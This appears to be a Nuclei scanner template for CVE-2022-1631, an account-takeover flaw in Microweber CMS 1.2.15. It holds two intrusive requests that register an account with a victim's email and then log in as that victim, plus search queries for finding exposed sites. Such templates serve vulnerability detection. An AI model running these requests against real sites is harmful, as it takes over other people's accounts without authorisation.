id: CVE-2022-1631

info:
  name: Microweber CMS 1.2.15 - Account Takeover
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Microweber CMS version 1.2.15 and below is vulnerable to account takeover due to lack of email verification and proper validation of email from social logins. An attacker can register an account using a victim's email and gain unauthorized access.
  impact: |
    Successful exploitation could lead to unauthorized access to user accounts.
  remediation: |
    Upgrade Microweber CMS to version 1.2.16 or later to mitigate CVE-2022-1631.
  reference:
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-1631
    cwe-id: CWE-284,CWE-863
    epss-score: 0.10242
    epss-percentile: 0.95187
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
  metadata:
    vendor: microweber
    product: microweber
    shodan-query: http.favicon.hash:780351152
    fofa-query:
      - body="microweber"
      - icon_hash=780351152
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/register"

    body: |
      {
        "email": "{{victim_email}}",
        "password": "{{attacker_password}}"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "Account created successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/auth/login"

    body: |
      {
        "email": "{{victim_email}}",
        "password": "{{attacker_password}}"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "Login successful"
        part: body
